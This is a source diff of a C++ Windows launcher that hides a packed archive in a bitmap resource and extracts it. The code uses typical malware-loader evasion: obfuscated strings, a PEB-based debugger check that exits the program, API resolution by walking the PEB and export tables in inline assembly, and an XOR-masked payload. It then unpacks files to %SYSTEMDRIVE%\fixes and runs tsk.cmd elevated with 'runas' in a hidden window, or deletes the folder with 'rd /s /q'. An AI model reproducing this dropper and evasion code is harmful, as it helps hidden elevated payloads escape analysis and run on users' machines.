@@ -50,6 +50,28 @@ template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }
 #define e31(s) e30(s),eca(s[30]),ecb(s[30])
 #define e32(s) e31(s),eca(s[31]),ecb(s[31])
 #define e33(s) e32(s),eca(s[32]),ecb(s[32])
+#define e34(s) e33(s),eca(s[33]),ecb(s[33])
+#define e35(s) e34(s),eca(s[34]),ecb(s[34])
+#define e36(s) e35(s),eca(s[35]),ecb(s[35])
+#define e37(s) e36(s),eca(s[36]),ecb(s[36])
+#define e38(s) e37(s),eca(s[37]),ecb(s[37])
+#define e39(s) e38(s),eca(s[38]),ecb(s[38])
+#define e40(s) e39(s),eca(s[39]),ecb(s[39])
+#define e41(s) e40(s),eca(s[40]),ecb(s[40])
+#define e42(s) e41(s),eca(s[41]),ecb(s[41])
+#define e43(s) e42(s),eca(s[42]),ecb(s[42])
+#define e44(s) e43(s),eca(s[43]),ecb(s[43])
+#define e45(s) e44(s),eca(s[44]),ecb(s[44])
+#define e46(s) e45(s),eca(s[45]),ecb(s[45])
+#define e47(s) e46(s),eca(s[46]),ecb(s[46])
+#define e48(s) e47(s),eca(s[47]),ecb(s[47])
+#define e49(s) e48(s),eca(s[48]),ecb(s[48])
+#define e50(s) e49(s),eca(s[49]),ecb(s[49])
+#define e51(s) e50(s),eca(s[50]),ecb(s[50])
+#define e52(s) e51(s),eca(s[51]),ecb(s[51])
+#define e53(s) e52(s),eca(s[52]),ecb(s[52])
+#define e54(s) e53(s),eca(s[53]),ecb(s[53])
+#define e55(s) e54(s),eca(s[54]),ecb(s[54])
 #define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
 #define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))
 void __(const char *s,unsigned short l){
@@ -61,7 +83,7 @@ void __(const char *s,unsigned short l){
 }
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
-HINSTANCE hmsvcrt,huser32,hshell32,hgdi32,hkernel32;
+HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;
 
 typedef HMODULE (WINAPI *LLA)(LPCSTR);
 LLA lla;
@@ -117,35 +139,25 @@ typedef ULONGLONG (WINAPI *VSCM)(ULONGLONG,DWORD,BYTE);
 VSCM vscm;
 typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
 VVIA vvia;
-typedef FARPROC (WINAPI *GPA)(HMODULE,LPCSTR);
-GPA gpa;
 typedef VOID (WINAPI *EXPW)(UINT);
 EXPW expw;
 typedef UINT (WINAPI *RWMA)(LPCSTR);
 RWMA rwma;
 typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
 SMA sma;
+typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*);
+CLTAW cltaw;
+typedef NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW);
+RGV rgv;
 
-typedef int (__cdecl *_access_t)(const char *,int);
-_access_t _access_p;
-typedef int (__cdecl *_mkdir_t)(const char *);
-_mkdir_t _mkdir_p;
-typedef int (__cdecl *fclose_t)(FILE *);
-fclose_t fclose_p;
-typedef errno_t (__cdecl *fopen_s_t)(FILE**,const char *,const char *);
-fopen_s_t fopen_s_p;
-typedef int (__cdecl *fputc_t)(int,FILE *);
-fputc_t fputc_p;
-typedef char *(__cdecl *getenv_t)(const char *);
-getenv_t getenv_p;
-typedef int (__cdecl *sprintf_t)(char *,const char * ... );
-sprintf_t sprintf_p;
-typedef size_t (__cdecl *strlen_t)(const char *);
-strlen_t strlen_p;
-typedef void (__cdecl *free_t)(void *);
-free_t free_p;
-typedef void *(__cdecl *calloc_t)(size_t,size_t);
-calloc_t calloc_p;
+inline uint16_t strlen_i(const char *src){
+  uint16_t i=0;
+  uint8_t *c=(uint8_t *)src;
+  while(*c++ && i++!=0xffff);
+  if(i==0xffff) i=0;
+  return i;
+};
+
 /*
 uint32_t __readfsdword(const uint32_t Offset){
     uint32_t value;
@@ -154,9 +166,8 @@ uint32_t __readfsdword(const uint32_t Offset){
 };
 */
 inline void dbg(){
-  DWORD pNtGlobalFlag=0;
   PPEB pPeb=(PPEB)__readfsdword(0x30);
-  pNtGlobalFlag=*(PDWORD)((PBYTE)pPeb+0x68);
+  DWORD pNtGlobalFlag=*(PDWORD)((PBYTE)pPeb+0x68);
 
   PUINT32 pProcessHeap=(PUINT32)((PBYTE)pPeb+0x18);
   PUINT32 pFlags=(PUINT32)(*pProcessHeap+0x40);
@@ -164,6 +175,67 @@ inline void dbg(){
 
   if((pNtGlobalFlag&0x70)||(*pFlags&~HEAP_GROWABLE)||*pForceFlags) expw(1);
   return;
+};
+
+
+void get_kernel32_handle(){
+  __asm__ volatile(
+    "xor (%0),      %0\n\t"
+    "mov %%fs:0x30, %0\n\t"
+    "mov 0x0C(%0),  %0\n\t"
+    "mov 0x14(%0),  %0\n\t"
+    "mov (%0),      %0\n\t"
+    "mov (%0),      %0\n\t"
+    "mov 0x10(%0),  %0\n\t"
+    : "=r"(hkernel32));
+/*
+  PPEB pPeb=(PPEB)__readfsdword(0x30);
+  PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=CONTAINING_RECORD(pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
+                                                            LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
+  hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
+*/
+};
+
+void get_ntdll_handle(){
+  __asm__ volatile(
+    "xor (%0),      %0\n\t"
+    "mov %%fs:0x30, %0\n\t"
+    "mov 0x0C(%0),  %0\n\t"
+    "mov 0x14(%0),  %0\n\t"
+    "mov (%0),      %0\n\t"
+    "mov 0x10(%0),  %0\n\t"
+    : "=r"(hntdll));
+};
+
+void *gpa(HMODULE m,const char *f){
+  ULONG_PTR moduleBase;
+  PIMAGE_DOS_HEADER dosHeader;
+  PIMAGE_NT_HEADERS ntHeaders;
+  PIMAGE_EXPORT_DIRECTORY eatDirectory;
+  DWORD* eatFunctions;
+  WORD* eatOrdinals;
+  DWORD* eatNames;
+  DWORD eatNameOffset;
+	moduleBase=(ULONG_PTR)m;
+  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
+	ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
+	eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
+  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
+  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
+  void *f_ptr=NULL;
+  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
+    eatNameOffset=eatNames[i];
+    char *src=(char*)(moduleBase+eatNameOffset);
+    char *dst=(char*)f;
+    while(*src && *dst){
+      if(*src!=*dst) break;
+      src++;
+      dst++;
+    };
+    if(*src==0 && *dst==0) f_ptr=(void *)(moduleBase+eatFunctions[eatOrdinals[i]]);
+  };
+  return f_ptr;
 };
 
 template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
@@ -190,6 +262,7 @@ TRACKMOUSEEVENT tme;
 int dlg_ret=0;
 bool inv=false;
 uint8_t read_shift=0;
+uint8_t read_mask=0;
 uint8_t *res;
 uint8_t *image;
 
@@ -544,13 +617,18 @@ uint8_t unpack_file(){
   return 0;
 }
 
+bool is_exists(const char *path){
+  uint32_t a=(uint32_t)GetFileAttributes(path);
+  return ((a!=INVALID_FILE_ATTRIBUTES) && (a&FILE_ATTRIBUTE_DIRECTORY));
+};
+
 void rmkdir(char *path,int depth){
-  for(uint16_t i=depth;i<strlen_p(path);i++){
+  for(uint16_t i=depth;i<strlen_i(path);i++){
     if(path[i]=='/'){
       path[i]=0;
-      if(_access_p(path,0)!=0){
-        _mkdir_p(path);
-        if(_access_p(path,0)!=0) return;
+      if(!is_exists(path)){
+        CreateDirectoryA(path,NULL);
+        if(!is_exists(path)) return;
       };
       path[i]='/';
       depth=i+1;
@@ -587,40 +665,38 @@ void init_unpack(const uint8_t *data_ptr,const uint32_t data_size_in){
 };
 
 void unarc(char *out){
-  FILE *o;
+  HANDLE o;
+  DWORD w;
   uint32_t fl=0,i;
-  char *t=(char *)&fl,fp[257];
+  char *t=(char *)&fl,fp[257],c;
   for(;;){
     if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==dsize) break;
-    for(i=0;i<strlen_p(out);i++) fp[i]=out[i];
+    for(i=0;i<strlen_i(out);i++) fp[i]=out[i];
     fp[i]='/';
-    if(read_packed_value(&fp[strlen_p(out)+1],fl)) break;
+    if(read_packed_value(&fp[strlen_i(out)+1],fl)) break;
     if(dptr==dsize) break;
-    fp[fl+strlen_p(out)+1]=0;
+    fp[fl+strlen_i(out)+1]=0;
     if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==dsize) break;
     rmkdir(fp,0);
-    _s(wb,"wb",2);
-    fopen_s_p(&o,fp,wb);
-    if(o){
+    o=CreateFileA(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(o!=INVALID_HANDLE_VALUE){
       for(i=0;i<fl;i++){
         if(unpack_file()) return;
-        fputc_p((char)symbol,o);
+        c=(char)symbol;
+        WriteFile(o,&c,1,&w,NULL);
       };
-      fclose_p(o);
+      CloseHandle(o);
     };
   };
 }
 
 bool iswin10(){
-  OSVERSIONINFOEXA osvi={sizeof(osvi),0,0,0,0,{0},0,0};
-  DWORDLONG const dwlConditionMask=vscm(
-    vscm(vscm(0,VER_MAJORVERSION,VER_GREATER_EQUAL),VER_MINORVERSION, VER_GREATER_EQUAL),VER_SERVICEPACKMAJOR,VER_GREATER_EQUAL);
-  osvi.dwMajorVersion=HIBYTE(_WIN32_WINNT_WINTHRESHOLD);
-  osvi.dwMinorVersion=LOBYTE(_WIN32_WINNT_WINTHRESHOLD);
-  osvi.wServicePackMajor=0;
-  return vvia(&osvi,VER_MAJORVERSION|VER_MINORVERSION|VER_SERVICEPACKMAJOR,dwlConditionMask)!=FALSE;
+  OSVERSIONINFOEXW osInfo;
+  osInfo.dwOSVersionInfoSize=sizeof(osInfo);
+  rgv(&osInfo);
+  return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
 };
 
 namespace obfs {
@@ -648,57 +724,6 @@ namespace obfs {
 
 #define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>>(str).decrypt())
 
-void gpa_kernel(){
-  __asm__ volatile(
-    "xor (%0),      %0\n\t"
-    "mov %%fs:0x30, %0\n\t"
-    "mov 0x0C(%0),  %0\n\t"
-    "mov 0x14(%0),  %0\n\t"
-    "mov (%0),      %0\n\t"
-    "mov (%0),      %0\n\t"
-    "mov 0x10(%0),  %0\n\t"
-    : "=r"(hkernel32));
-  ULONG_PTR moduleBase;
-  PIMAGE_DOS_HEADER dosHeader;
-  PIMAGE_NT_HEADERS ntHeaders;
-  PIMAGE_EXPORT_DIRECTORY eatDirectory;
-  DWORD* eatFunctions;
-  WORD* eatOrdinals;
-  DWORD* eatNames;
-  DWORD eatNameOffset;
-	moduleBase=(ULONG_PTR)hkernel32;
-  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
-	ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
-	eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
-  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
-  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
-  char *kern_gpa=(char *)o("GetProcAddress");
-  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
-    eatNameOffset=eatNames[i];
-    char *src=(char*)(moduleBase+eatNameOffset);
-    char *dst=kern_gpa;
-    while(*src && *dst){
-      if(*src!=*dst) break;
-      src++;
-      dst++;
-    };
-    if(*src==0 && *dst==0) gpa=(GPA)(moduleBase+eatFunctions[eatOrdinals[i]]);
-  };
-  kern_gpa=(char *)o("ExitProcess");
-  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
-    eatNameOffset=eatNames[i];
-    char *src=(char*)(moduleBase+eatNameOffset);
-    char *dst=kern_gpa;
-    while(*src && *dst){
-      if(*src!=*dst) break;
-      src++;
-      dst++;
-    };
-    if(*src==0 && *dst==0) expw=(EXPW)(moduleBase+eatFunctions[eatOrdinals[i]]);
-  };
-};
-
 #define data_res 0x10
 #define image_size 386584
 
@@ -714,7 +739,7 @@ inline uint8_t *load_res(uint32_t id){
   return NULL;
 };
 
-inline uint8_t bytes2byte(){
+inline uint8_t bytes2byte_raw(){
   uint8_t b=0;
   b|=(*res&0x03); b<<=2; res++; read_shift++;
   if(read_shift==3){ res++; read_shift=0; };
@@ -727,6 +752,12 @@ inline uint8_t bytes2byte(){
   return b;
 };
 
+inline uint8_t bytes2byte(){
+  uint8_t b=bytes2byte_raw()^read_mask;
+  read_mask=b;
+  return b;
+};
+
 inline void bytes2uint(uint32_t &b){
   b=0;
   b|=bytes2byte(); b<<=8;
@@ -736,109 +767,108 @@ inline void bytes2uint(uint32_t &b){
 };
 
 void init(){
-  gpa_kernel();
+  get_ntdll_handle();
+  get_kernel32_handle();
+  expw=(EXPW)gpa(hkernel32,o("ExitProcess"));
+  if(!expw) return;
   res=(uint8_t *)(load_res(data_res)+54);
   if(res==NULL) expw(1);
+  read_mask=bytes2byte_raw();
   uint32_t c=0;
   bytes2uint(c);
   for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
-  dbg();
   _s(dll_u,"User32",6);
-  _s(dll_m,"msvcrt",6);
   _s(dll_s,"Shell32",7);
   _s(dll_g,"Gdi32",5);
-  _s(f0000,"_access",7);
-  _s(f0001,"_mkdir",6);
-  _s(f0002,"fclose",6);
-  _s(f0003,"fopen_s",7);
-  _s(f0004,"fputc",5);
-  _s(f0005,"getenv",6);
-  _s(f0006,"sprintf",7);
-  _s(f0007,"strlen",6);
-  _s(f0008,"free",4);
-  _s(f0009,"calloc",6);
-  _s(f0010,"CreateBitmap",12);
-  _s(f0011,"CreateCompatibleDC",18);
-  _s(f0012,"DeleteDC",8);
-  _s(f0013,"DeleteObject",12);
-  _s(f0014,"GetObjectA",10);
-  _s(f0015,"ShellExecuteExA",15);
-  _s(f0016,"FreeLibrary",11);
-  _s(f0017,"BitBlt",6);
-  _s(f0018,"SelectObject",12);
-  _s(f0019,"CreatePen",9);
-  _s(f0020,"LineTo",6);
-  _s(f0021,"MoveToEx",8);
-  _s(f0022,"AdjustWindowRect",16);
-  _s(f0023,"BeginPaint",10);
-  _s(f0024,"EndPaint",8);
-  _s(f0025,"GetClientRect",13);
-  _s(f0026,"GetDC",5);
-  _s(f0027,"GetSystemMetrics",16);
-  _s(f0028,"InvalidateRect",14);
-  _s(f0029,"PtInRect",8);
-  _s(f0030,"ReleaseCapture",14);
-  _s(f0031,"ReleaseDC",9);
-  _s(f0032,"TrackMouseEvent",15);
-  _s(f0033,"UpdateWindow",12);
-  _s(f0034,"LoadLibraryA",12);
-  _s(f0035,"VerSetConditionMask",19);
-  _s(f0036,"VerifyVersionInfoA",18);
-  _s(f0037,"RegisterWindowMessageA",22);
-  _s(f0038,"SendMessageA",12);
-  get_fn_ptr(flib,hkernel32,f0016);
-  get_fn_ptr(lla,hkernel32,f0034);
-  hmsvcrt=lla(dll_m);
-  huser32=lla(dll_u);
+  _s(f0001,"CreateBitmap",12);
+  _s(f0002,"CreateCompatibleDC",18);
+  _s(f0003,"DeleteDC",8);
+  _s(f0004,"DeleteObject",12);
+  _s(f0005,"GetObjectA",10);
+  _s(f0006,"ShellExecuteExA",15);
+  _s(f0007,"FreeLibrary",11);
+  _s(f0008,"BitBlt",6);
+  _s(f0009,"SelectObject",12);
+  _s(f0010,"CreatePen",9);
+  _s(f0011,"LineTo",6);
+  _s(f0012,"MoveToEx",8);
+  _s(f0013,"AdjustWindowRect",16);
+  _s(f0014,"BeginPaint",10);
+  _s(f0015,"EndPaint",8);
+  _s(f0016,"GetClientRect",13);
+  _s(f0017,"GetDC",5);
+  _s(f0018,"GetSystemMetrics",16);
+  _s(f0019,"InvalidateRect",14);
+  _s(f0020,"PtInRect",8);
+  _s(f0021,"ReleaseCapture",14);
+  _s(f0022,"ReleaseDC",9);
+  _s(f0023,"TrackMouseEvent",15);
+  _s(f0024,"UpdateWindow",12);
+  _s(f0025,"LoadLibraryA",12);
+  _s(f0026,"RegisterWindowMessageA",22);
+  _s(f0027,"SendMessageA",12);
+  _s(f0028,"CommandLineToArgvW",18);
+  _s(f0029,"RtlGetVersion",13);
+  get_fn_ptr(flib,hkernel32,f0007);
+  get_fn_ptr(lla,hkernel32,f0025);
   hgdi32=lla(dll_g);
+  huser32=lla(dll_u);
   hshell32=lla(dll_s);
-  get_fn_ptr(vscm,hkernel32,f0035);
-  get_fn_ptr(vvia,hkernel32,f0036);
-  get_fn_ptr(_access_p,hmsvcrt,f0000);
-  get_fn_ptr(_mkdir_p,hmsvcrt,f0001);
-  get_fn_ptr(fclose_p,hmsvcrt,f0002);
-  get_fn_ptr(fopen_s_p,hmsvcrt,f0003);
-  get_fn_ptr(fputc_p,hmsvcrt,f0004);
-  get_fn_ptr(getenv_p,hmsvcrt,f0005);
-  get_fn_ptr(sprintf_p,hmsvcrt,f0006);
-  get_fn_ptr(strlen_p,hmsvcrt,f0007);
-  get_fn_ptr(free_p,hmsvcrt,f0008);
-  get_fn_ptr(calloc_p,hmsvcrt,f0009);
-  get_fn_ptr(awr,huser32,f0022);
-  get_fn_ptr(bep,huser32,f0023);
-  get_fn_ptr(epa,huser32,f0024);
-  get_fn_ptr(gcr,huser32,f0025);
-  get_fn_ptr(gdc,huser32,f0026);
-  get_fn_ptr(gsm,huser32,f0027);
-  get_fn_ptr(ivr,huser32,f0028);
-  get_fn_ptr(pir,huser32,f0029);
-  get_fn_ptr(rcp,huser32,f0030);
-  get_fn_ptr(rdc,huser32,f0031);
-  get_fn_ptr(tmv,huser32,f0032);
-  get_fn_ptr(uwi,huser32,f0033);
-  get_fn_ptr(rwma,huser32,f0037);
-  get_fn_ptr(sma,huser32,f0038);
-  get_fn_ptr(cbmp,hgdi32,f0010);
-  get_fn_ptr(cdc,hgdi32,f0011);
-  get_fn_ptr(ddc,hgdi32,f0012);
-  get_fn_ptr(dob,hgdi32,f0013);
-  get_fn_ptr(goa,hgdi32,f0014);
-  get_fn_ptr(blt,hgdi32,f0017);
-  get_fn_ptr(sob,hgdi32,f0018);
-  get_fn_ptr(crp,hgdi32,f0019);
-  get_fn_ptr(lto,hgdi32,f0020);
-  get_fn_ptr(mte,hgdi32,f0021);
-  get_fn_ptr(sea,hshell32,f0015);
+  rgv=(RGV)gpa(hntdll,f0029);
   if (!iswin10()) expw(0);
+  get_fn_ptr(awr,huser32,f0013);
+  get_fn_ptr(bep,huser32,f0014);
+  get_fn_ptr(epa,huser32,f0015);
+  get_fn_ptr(gcr,huser32,f0016);
+  get_fn_ptr(gdc,huser32,f0017);
+  get_fn_ptr(gsm,huser32,f0018);
+  get_fn_ptr(ivr,huser32,f0019);
+  get_fn_ptr(pir,huser32,f0020);
+  get_fn_ptr(rcp,huser32,f0021);
+  get_fn_ptr(rdc,huser32,f0022);
+  get_fn_ptr(tmv,huser32,f0023);
+  get_fn_ptr(uwi,huser32,f0024);
+  get_fn_ptr(rwma,huser32,f0026);
+  get_fn_ptr(sma,huser32,f0027);
+  get_fn_ptr(cbmp,hgdi32,f0001);
+  get_fn_ptr(cdc,hgdi32,f0002);
+  get_fn_ptr(ddc,hgdi32,f0003);
+  get_fn_ptr(dob,hgdi32,f0004);
+  get_fn_ptr(goa,hgdi32,f0005);
+  get_fn_ptr(blt,hgdi32,f0008);
+  get_fn_ptr(sob,hgdi32,f0009);
+  get_fn_ptr(crp,hgdi32,f0010);
+  get_fn_ptr(lto,hgdi32,f0011);
+  get_fn_ptr(mte,hgdi32,f0012);
+  get_fn_ptr(sea,hshell32,f0006);
+  get_fn_ptr(cltaw,hshell32,f0028);
 };
 
-INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,INT nCmdShow){
+char *wchartocodepage(const wchar_t *src,UINT cp){
+  char *c_buf=NULL;
+  if(src){
+    int ln=WideCharToMultiByte(cp,0,src,-1,NULL,0,NULL,NULL);
+    if(ln){
+      c_buf=(char *)LocalAlloc(LMEM_ZEROINIT,ln);
+      if(c_buf){
+        if(!WideCharToMultiByte(cp,0,src,-1,c_buf,ln,NULL,NULL)){
+          LocalFree(c_buf);
+          c_buf=NULL;
+        };
+      };
+    };
+  };
+  return c_buf;
+}
+
+extern "C" void __stdcall start(){
   init();
-  image=(uint8_t*)calloc_p(image_size,1);
+  if(!expw) return;
+  uint32_t res_size=0;
+  image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
   if(image){
-    uint32_t res_size=0;
     bytes2uint(res_size);
-    uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
+    uint8_t *packed=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,res_size);
     if(packed){
       for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
       init_unpack(packed,res_size);
@@ -847,20 +877,41 @@ INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,IN
         image[i]=(uint8_t)symbol;
         if(dptr==dsize) break;
       };
-      free_p(packed);
+      LocalFree(packed);
     } else expw(1);
-    null_window(0);
+    int c=0;
+    LPWSTR *argv=cltaw(GetCommandLineW(),&c);
+    if(argv){
+      if(c>1){
+        char *cmd=wchartocodepage(argv[1],CP_OEMCP);
+        if(cmd){
+          _s(argcmd,"start",5);
+          char *a=(char *)argcmd;
+          char *b=cmd;
+          while(*a && *b &&*a==*b){
+            a++;
+            b++;
+          };
+          if(*a==0 && *b==0) dlg_ret=1;
+          LocalFree(cmd);
+        };
+      };
+      LocalFree(argv);
+    };
+    if(!dlg_ret) null_window(0);
+    dbg();
     if(dlg_ret){
       _s(drv_e,"SYSTEMDRIVE",11);
-      _s(mas_a,"%s/",3);
       _s(sea_m,"runas",5);
       _s(sea_c,"cmd.exe",7);
       _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
-      _s(sea_r,"/c rd /s /q %SYSTEMDRIVE%\\fixes",31);
+      _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
       char path[257];
-      sprintf_p(path,mas_a,getenv_p(drv_e));
+      GetEnvironmentVariableA(drv_e,path,257);
+      path[strlen_i(path)+1]=0;
+      path[strlen_i(path)]='/';
       bytes2uint(res_size);
-      uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
+      uint8_t *packed=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,res_size);
       if(packed){
         for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
         init_unpack(packed,res_size);
@@ -876,18 +927,19 @@ INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,IN
         ShExecInfo.nShow=0;
         ShExecInfo.hInstApp=0;
         if(sea(&ShExecInfo)==FALSE){
+          res_size=0;
+          ShExecInfo.fMask=SEE_MASK_NOASYNC;
           ShExecInfo.lpVerb=NULL;
           ShExecInfo.lpParameters=sea_r;
           sea(&ShExecInfo);
         };
-        free_p(packed);
+        LocalFree(packed);
       } else expw(1);
     };
-    free_p(image);
+    LocalFree(image);
   };
   flib(hshell32);
   flib(hgdi32);
   flib(huser32);
-  flib(hmsvcrt);
-  return 0;
+  if(!res_size) expw(0);
 }
